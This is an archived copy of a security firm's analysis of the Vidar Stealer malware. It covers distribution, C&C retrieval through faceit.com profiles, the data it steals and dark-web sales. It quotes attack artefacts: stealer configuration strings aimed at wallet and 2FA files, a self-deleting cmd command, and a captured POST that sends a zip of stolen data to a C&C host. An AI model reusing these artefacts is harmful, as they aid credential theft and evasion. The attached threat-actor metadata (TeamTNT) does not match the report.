{
    "id": "ef2b8cbb-a73c-46c6-9c6e-9a2ef0f6f67f",
    "created_at": "2023-01-12T15:08:34.571063Z",
    "updated_at": "2025-03-27T02:06:03.427652Z",
    "deleted_at": null,
    "sha1_hash": "810310adc179f5b5acefde725431a3882201dd2d",
    "title": "2021-05-28 - Deep Analysis of Vidar Stealer",
    "authors": "",
    "file_creation_date": "2022-05-28T18:59:09Z",
    "file_modification_date": "2022-05-28T18:59:09Z",
    "file_size": 7021588,
    "plain_text": "# Deep Analysis of Vidar Stealer\n\n**[medium.com/s2wlab/deep-analysis-of-vidar-stealer-ebfc3b557aed](https://medium.com/s2wlab/deep-analysis-of-vidar-stealer-ebfc3b557aed)**\n\nS2W May 23, 2022\n\n[S2W](https://medium.com/@s2w?source=post_page-----ebfc3b557aed--------------------------------)\n\nMay 28, 2021\n\n\n12 min read\n\nAuthor: [hypen (Sojun Ryu) @ Talon](https://medium.com/u/c109a5c416ae?source=post_page-----ebfc3b557aed--------------------------------)\n\nMonkey Thief\n\n## Executive Summary\n\nVidar Stealer is a malware specialized in stealing information mainly distributed as\nspam mail or crack version commercial software and keygen program. When installed,\ndata such as infected device information, account, and history recorded in the browser\nis collected and leaked to the C&C server.\nIn particular, it is one of the Stealer logs widely traded in DDW, and logs of infected\nPCs worldwide are being sold.\n\n\n-----\n\nPreviously, Vidar Stealer communicated with the C&C server hard-coded inside the\nmalware, but from February 3, 2021, the method was changed to dynamically read the\nC&C server from the regular site.\nVidar stealer switches its target software frequently in order to steal credential\ninformation stored in various browsers and programs. Therefore, the C&C server is\ncontinuously changing, so an automated response is necessary.\nS2W LAB has been analyzing Vidar Stealer malware behaviors and tracking changes\nand preventing related damage by collecting logs that are traded through DDW.\n\nThe flow of Vidar Stealer behavior\n\n## Related Articles\n\n The Routes of Infection\n\nRecently, Vidar Stealer is mainly disguised as a Windows activation software. Because the\nWindows product is expensive, many people download illegal activation software to use it for\nfree. In addition to Windows, many cases are disguised as a cracked commercial software,\nkeygen software, etc. Users may recognize the risk of the software as most vaccines be able\nto detect and alert users, but they tend to ignore and execute them by taking their own risk.\n\nWindows 10 Pro x64 keygen, Ardamax Keylogger 5.2 Crack, SmartMovie v3.25 Keygen\n\n\n-----\n\nLast year, Vidar Stealer was distributed in South Korea through spam emails impersonated\nby the Fair Trade Commission. The contents in the email lure victims to open the attached\nfile disguised as an official request letter. If the victim executes the attached file disguised as\na document file icon, the user will be infected by Vidar stealer.\n\n\n-----\n\nEmail disguised as the Fair Trade Commission\nAs Vidar Stealer has not been distributed with high-level technologies or serious\nvulnerabilities so far, so if users do not use illegal programs or access suspicious sites with\ncaution, they can sufficiently prevent infection.\n\n## Vidar Stealer Behavior Analysis\n\n 1. Loader\n\nVidar Stealer is packed with an unknown loader to prevent analysis. This loader’s\ncharacteristic is that data, strings, binaries, and other data necessary for malicious behavior\ndo not have regularity. Because of this feature, it is challenging to detect this loader\ncompletely with a static method using detection signatures and Yara rules. In addition, even\nif the loader is detected, there is a limit to accurately distinguishing what the actual internal\nmalicious code is.\n\nCode that assigns execute permission (VirtualProtect)\n\nAdditional binary decoding routine\n\n\n-----\n\nOn March 31, 2021, a malware analyst on Twitter (@c3rb3ru5d3d53c) named this Loader\n“DerpLoader” and noted that Vidar Stealer, as well as other Stealer malware such as KPot\nStealer and Racoon Stealer, use it. As a result of the analysis, it was confirmed that all three\nstealers’ loaders are the same loader. Stealers mainly use EXE distribution methods\ndisguised as specific programs, so they are easily exposed to AV. It is assumed that various\nStealers use this loader to maximize detection avoidance.\n\nVidar Stealer and DerpLoader mentioned on Twitter\n\n## 2. Vidar Stealer\n\n Decode strings\n\nWhen Vidar Stealer is executed by the loader, the encoded string is firstly decoded and the\nstring required for malicious behavior is extracted. As a decoding method, RC4 and Base64\nare used in combination. For the RC4 Key, a string composed of 18 numbers is used, and\neach sample uses a different key.\n\nEncoded strings in Vidar Stealer\n\n\n-----\n\nDecoding strings using CyberChef\n\n## Dynamic collection of C&C servers\n\nIn the former Vidar Stealer malware, the C&C server address was hard-coded. However,\nstarting on February 3 this year, a method of dynamically collecting C&C servers has started\nusing API functions provided by “faceit.com”, a Russian game-related community. The\nadvantage of this method is that the faceit.com site cannot be blocked because it is a normal\nsite.\n\nAccording to the former method, if the C&C server used by the malware is taken down, the\nmalware becomes useless. However, in the case of dynamic collection, the C&C of the\nmalware can be automatically updated by changing the content of “faceit.com” without\nmodifying the malware every time.\n```\nhttps://api.faceit[.]com/core/v1/nicknames/[Attacker's nickname]\n\n```\nC&C server is included in the ‘about’ field of JSON format data\n\n## Normal DLL file download\n\nAfter that, Vidar Stealer downloads the normal DLL file required for malicious activity.\n```\nNormal DLL File PathC:\\ProgramData\\\n\n```\n**Normal DLL files related to Firefox**\n\n\n-----\n\n1. freebl3.dll\n2. mozglue.dll\n3. msvcp140.dll\n4. nss3.dll\n5. softokn3.dll\n\n**Normal DLL files related to C/C++**\n\n1. vcruntime140.dll\n2. msvcp140.dll\n\n## Request configuration data\n\nAfter downloading the DLL file, the malware requests a specific page containing the\nconfiguration values. On this page, option values for which data to collect from the infected\ndevice are specified. Each option value is divided by ‘,’ and consists of a total of 12 values.\nAmong these, some option values are not actually used. In addition, passwords.txt,\ninformation.txt, outlook.txt, files\\Soft are unconditionally collected regardless of the options.\n```\n1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%\\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*\n\n```\n**Option 1, 5, 6, 10, 11 : Not used**\n\n**Option 2: Option to steal Browser’s Autofill, Cookies, Credit Cards data**\n\n**Option 3: Option to steal Browser’s History, Downloads**\n\n**Option 4: Option to steal Wallet data**\n\n**Option 7: Option to steal Telegram data**\n\n**Option 8: Option to get the Screen capture**\n\n**Option 9: Option to steal Certain files**\n\nWhen the 9th option is activated, all files with a specific file name are collected using the last\nstring separated by ‘;’. The format is as follows, and the collected files are saved in\nfiles\\Files\\[Work Folder].\n```\n[Save Folder];[Target Path];[Target file name list];[Maximum file size];[Seperator]\n\n## Data Theft\n\n```\nThe target software list is as follows. The target browser may be different for each malware\nbecause the attacker can customize the target browser list. As the version of Vidar Stealer\ngoes up, the collection range is getting wider, and as of March 21, the highest version\nidentified is 38. All stolen information is collected in the path below.\n```\nC:\\ProgramData\\[A-Z0–9]{25}\\files\\\n\n```\n\n-----\n\n## Compress the collected folder\n\nAfter collecting all the data, compress the “\\files” folder into a ZIP file. The path of the created\nZIP file is as follows, and different file names are used for each version.\n```\nC:\\ProgramData\\[A-Z0–9]{25}\\[MachineGUID][0–9]{10}.zip\n\n## Send data\n\n```\nAfterward, it transmits a ZIP file containing the stolen data along with the infected device ID,\ninformation, and the version of Vidar to the C&C server.\n\n## Download additional payload\n\nIf the attacker sets additional functions, there is the function to download and execute\nadditional malware after leaking information to the C&C server. After requesting\nHTTP_QUERY_REFRESH, if the result contains the string “http”, it accesses the given URL\nto read additional configuration data. After this process, finally, it extracts the URL and\ndownloads the malicious payload.\n\n\n-----\n\n```\nC&C Server Download configuration data Get download URL Download another\nmalwareC:\\ProgramData\\[A-Z0–9]{16}.exe “:Zone.Identifier”\n\n## Self-deleting\n\n```\nAfter performing all malicious actions, Vidar Stealer deletes its own traces with the command\nbelow.\n```\n“C:\\Windows\\System32\\cmd.exe” /c taskkill /im [Filename] /f & erase [File path] &\nexit\n\n## Analysis of the domain used in the attack\n\n```\nS2W LAB has been continuously monitoring and tracking Vidar Stealer’s C&C server\nconstruction method for three months since February 2021.\n\n## 1. api.faceit.com\n\nThe attacker first joined a game-related community in Russia called “faceit.com”. After that,\nthe attacker has been updating the C&C server by using the Profile section of the user\ninformation page, and the malware requests this information through the API.\n\nC&C server stored in the user information page\nThe attacker has changed the community nickname for about three months and the C&C\nserver collection URL. There are a total of 6 nicknames identified so far, and the created time\nand collected C&C servers are summarized below. When the nickname is replaced, the C&C\nserver is not updated from the existing nickname, and the existing C&C servers are no\nlonger used.\n\n\n-----\n\n**List of faceit.com addresses used to collect C&C servers, Created time: 2021–02–03**\n_15:39:24 (UTC), Created time: 2021–02–19 13:13:17 (UTC), Created time: 2021–03–01_\n_19:34:49 (UTC), Created time: 2021–03–11 20:36:28 (UTC), Created time: 2021–03–15_\n_17:23:12 (UTC), Created time: 2021–03–18 11:07:19 (UTC), Created time: 2021–03–30_\n_20:46:17 (UTC), Created time: 2021–04–26 15:50:43 (UTC), Created time: 2021–05–04_\n_08:40:44 (UTC), Created time: 2021–05–17 23:39:57 (UTC), Created time: 2021–05–24_\n_17:09:30 (UTC)_\n\n## 2. C&C server\n\nThe attacker used many domains and IPs because the C&C server was changed in one day\nor every 3 to 4 days. We arranged the C&C server domains that we collected over three\nmonths, and we were able to confirm some characteristics.\n\nMost domains registered through NameSilo\n\nNumerous C&C servers registered through NameSilo\n\nE-mail that the attacker used to register the domain. In particular, “xeronxik123” is\nstrongly suspected as the ID was also used as the faceit.com nickname.1) 2)\n\nInitially, the attacker registered and used the domain, but after that, it seems that the normal\ndomain was compromised and used as a C&C server. Recently, Vidar communicates with IP\ntype C&C server, and sometimes it is reused when the nickname is changed.\n\nThe latest version of C&C Server list is continuously updated on the\n\n\n-----\n\n-----\n\n## 3. Admin site\n\nVidar Stealer can manage infected devices and control overall statistics through the admin\nsite “my-vidar.com”.\n\n\n-----\n\nmy-vidar.com/auth/login\n\n## Vidar Stealer in DDW\n\n 1. Vidar Stealer rental post\n\nVidar Stealer is a MaaS-type malware sold on dark web forums. As shown in the post below,\nsales are being made, and they are actively trading from at least November 2018 to the\npresent. Attackers collect information by targeting specific users with the rented malware or\nsell logs collected to an unspecified number of users again on DDW.\n\n**• Prices**\n\n7 days → $130\n\n14 days → $200\n\n30 days → $300\n\n60 days → $580\n\n90 days → $750\n\n\n-----\n\nVidar Stealer sales post on the dark web\n\n\n-----\n\n## 2. Vidar Stealer Log Sales Post\n\nPosts that sell logs collected by Vidar Stealer to DDW are also being found steadily. Mostly,\nrather than logs for a single target, many logs containing various countries are sold. It is\noften found that such postings also include Korea.\n\n\n-----\n\nVidar Stealer Log Sales in Deep Web Forum\nSince the collected log files are divided into KR as below, it is easy to identify that they are\nKorean victims, and password information and infected device information are stored inside\nthe file.\n\n\n-----\n\nVidar Stealer log files\n\nKorean site cookie information in the log file\n\n## Conclusion\n\nThe latest version of all Vidar Stealer malicious code C&C servers are constantly being\nchanged through a dynamic acquisition method, but only one C&C server is active at the\ntime of execution. Therefore, if a new C&C server can be collected by monitoring the C&C\nserver collection URL, information leakage can be prevented even if it is infected with a\nmalicious code, and measures can be taken by detecting infected devices attempting to\nconnect.\n\nS2W LAB is monitoring the continuously updated Vidar Stealer C&C server collection URL,\nand through this, the C&C server is also being collected. In addition, we continue to analyze\nand track changes in Vidar Stealer’s C&C connection method.\n\nIn the past, Stealer malware caused direct damage to individuals rather than companies, but\nwith the recent increase in telecommuting due to the coronavirus, Stealer malware likely to\nsteal accounts that can access corporate business networks. Since account stealing is\n\n\n-----\n\nattempted not only for web browsers but also for various software, if important accounts are\nstolen, it is possible to infiltrate the corporate network. So, if these logs are sold to\nransomware attack groups, the damage is out of control.\n\nIn order to prevent Vidar Stealer infection, users should be cautious of executing programs\nfrom unknown sources, executing cracked or illegal activation programs, and opening spam\nemails.\n```\nWe also provide futher information regarding various Stealers via Xarvis Enterprise.\nPlease refer to below pictures captured from Xarvis Enterprise.\n\n```\nRelation Graph of Vidar Stealer on Xarvis Enterprise\n\n\n-----\n\nCredential Leak Monitoring Dashboard inside Xarvis Enterprise\n\n## Appendix\n\n Appendix 1: Example of the leaked file\n\nFilename: information.txt\n\n\n-----\n\n```\nVersion: 37.5\n Date: Fri Feb 12 08:24:56 2021\n MachineID: eeeb5d54-7880-42a7-b542-739bbc26cf4b\n GUID: {846ee340-7039-11de-9d20-806e6f6e6963}\n HWID: eeeb5d54-7880-42a7-b542-9d20-806e6f6e6963\n Path: C:\\Users\\admin\\AppData\\Roaming\\build.exe\n Work Dir: C:\\\\ProgramData\\\\A2KA889SJFAXH2KBIL2MLRZVK\n Windows: Windows 7 Professional [x64]\n Computer Name: USER-PC\n User Name: admin\n Display Resolution: 1280x720\n Display Language: en-US\n Keyboard Languages: English (United States)\n Local Time: 12/2/2021 8:24:56\n TimeZone: UTC-0\n [Hardware]\n Processor: Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz\n CPU Count: 4\n RAM: 4095 MB\n VideoCard: Standard VGA Graphics Adapter\n [Processes]\n ---------- System [4]\n ------------------------------ smss.exe [272]\n - csrss.exe [352]\n - wininit.exe [400]\n - csrss.exe [412]\n - winlogon.exe [456]\n - services.exe [496]\n - lsass.exe [504]\n - lsm.exe [512]\n - svchost.exe [616]\n - IMEDICTUPDATE.EXE [1224]\n - srvpost.exe [1356]\n - SearchIndexer.exe [1412]\n - taskhost.exe [1796]\n  ….\n [Software] Adobe Flash Player 27 ActiveX [27.0.0.187] Adobe Flash Player 27 NPAPI\n[27.0.0.187] Adobe Flash Player 27 PPAPI [27.0.0.187] Microsoft Visual C++ 2013\nRedistributable (x64) - 12.0.30501 [12.0.30501.0] Microsoft Visual C++ 2019 X86\nMinimum Runtime - 14.21.27702 [14.21.27702] Microsoft Visual C++ 2019 X86 Additional\nRuntime - 14 21 27702 [14 21 27702] Skype 7 39 [7 39 102] Microsoft Visual C++ 2015\n```\n\n-----\n\n```\n2019 Redistributable (x86) 14.21.27702 [14.21.27702.2] 2019 Redistributable (x64)\n- 14.21.27702 [14.21.27702.2] Realtek AC'97 Audio\n\n## Appendix 2: Communication\n\n```\napi.faceit.com connection packet (HTTPS connection)\n\nJSON data received from C&C\n\n\n-----\n\n```\n{  result : ok,  payload : {   country : ca,   registration_status :\n\"active\",   \"about\": \"|\",   \"matches_left\": 0,  \n\"private_tournaments_invitations\": {},   \"user_type\": \"user\",   \"games\": {},  \n\"matches_not_played\": 0,   \"settings\": {    \"language\": \"en\"   },  \n\"active_team_id\": null,   \"newsletter_promotions\": false,   \"version\": 4,  \n\"created_by\": \"anonymous\",   \"favorite_tournaments\": [],   \"activated_at\": \"Wed\nFeb 03 15:39:24 UTC 2021\",   \"invitations_remaining\": 10,   \"steam_id\": \"\",  \n\"ongoing_rooms\": {},   \"updated_by\": \"5ee7a37c-54b8-4dac-a211-0329602f9398\",  \n\"guid\": \"5ee7a37c-54b8-4dac-a211-0329602f9398\",   \"private_tournaments\": [],  \n\"status\": \"AVAILABLE\",   \"guest_info\": {},  \n\"notification_tournament_joined_starts\": false,   \"friends_ids\": [],   \"flag\":\n\"\",   \"created_at\": \"\",   \"membership\": {    \"type\": \"free\"   },  \n\"memberships\": [    \"free\"   ],   \"newsletter_general\": false,   \"nickname\":\n\"\",   \"ongoing_tournaments\": {},   \"socials\": {},   \"website\": \"\",  \n\"verified\": false,   \"entity_type\": \"user\"  },  \"server_epoch_time\": 1613118241, \n\"message\": \"Operation performed correctly.\",  \"env\": \"prod\",  \"you_are\": {  \n\"roles\": [    \"anonymous\"   ],   \"user\": \"anonymous\"  },  \"version\":\n\"2.174.3\" }\n\n```\nConfiguration data for stealing information\n```\n1,1,1,1,1,1,1,0,1,1,250,Desktop;%DESKTOP%\\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*\nDesktop\\;*.*;4000;true;movies:music:mp3;Atomic;%APPDATA%\\Atomic\\;*.*;4000;true;movies:\n*.*:*ledger*.*:*trezor*.*:*wazirx*.*:*mew*.*:*bithimb*.*:*hitbtc*.*:*bitflyer*.*:*kuco\n\n```\nCaptured Packet to breach victim’s data\n\n\n-----\n\n```\nPOST / HTTP/1.1\n Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png,\nimage/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\n Accept-Language: ru-RU,ru;q=0.9,en;q=0.8\n Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\n Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\n Content-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\n Content-Length: 8698\n Host: duckclack.com\n Connection: Keep-Alive\n Cache-Control: no-cache\n --1BEF0A57BE110FD467A\n Content-Disposition: form-data; name=\"hwid\"\n eeeb5d54-7880-42a7-b542-9d20-806e6f6e6963\n --1BEF0A57BE110FD467A\n Content-Disposition: form-data; name=\"os\"\n Windows 7 Professional\n --1BEF0A57BE110FD467A\n Content-Disposition: form-data; name=\"platform\"\n x64\n --1BEF0A57BE110FD467A\n Content-Disposition: form-data; name=\"profile\"\n 399\n --1BEF0A57BE110FD467A\n Content-Disposition: form-data; name=\"user\"\n admin\n --1BEF0A57BE110FD467A\n Content-Disposition: form-data; name=\"cccount\"\n 0\n --1BEF0A57BE110FD467A\n Content-Disposition: form-data; name=\"fcount\"\n\n```\n\n-----\n\n```\n 2\n --1BEF0A57BE110FD467A\n Content-Disposition: form-data; name=\"telegram\"\n 0\n --1BEF0A57BE110FD467A\n Content-Disposition: form-data; name=\"ver\"\n 37.5\n --1BEF0A57BE110FD467A\n Content-Disposition: form-data; name=\"ccount\"\n 0\n --1BEF0A57BE110FD467A\n Content-Disposition: form-data; name=\"logs\"; filename=\"eeeb5d54-7880-42a7-b542739bbc26cf4b8568363090.zip\"\n Content-Type: zip\n PK ... PK --1BEF0A57BE110FD467A-\n## Appendix 3: MITRE ATT&CK\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-05-28 - Deep Analysis of Vidar Stealer.pdf"
    ],
    "report_names": [
        "2021-05-28 - Deep Analysis of Vidar Stealer.pdf"
    ],
    "threat_actors": [
        {
            "id": "f809bfcb-b200-4988-80a8-be78ef6a52ef",
            "created_at": "2023-01-06T13:46:39.186988Z",
            "updated_at": "2025-03-27T02:00:03.016358Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "Adept Libra"
            ],
            "source_name": "MISPGALAXY:TeamTNT",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c3ca592f-0669-49bd-ab5c-310007ab2fb4",
            "created_at": "2022-10-25T15:50:23.334495Z",
            "updated_at": "2025-03-27T02:00:55.445098Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "TeamTNT"
            ],
            "source_name": "MITRE:TeamTNT",
            "tools": [
                "Peirates",
                "MimiPenguin",
                "LaZagne",
                "Hildegard"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536114,
    "ts_updated_at": 1743041163,
    "ts_creation_date": 1653764349,
    "ts_modification_date": 1653764349,
    "files": {
        "pdf": "https://archive.orkl.eu/810310adc179f5b5acefde725431a3882201dd2d.pdf",
        "text": "https://archive.orkl.eu/810310adc179f5b5acefde725431a3882201dd2d.txt",
        "img": "https://archive.orkl.eu/810310adc179f5b5acefde725431a3882201dd2d.jpg"
    }
}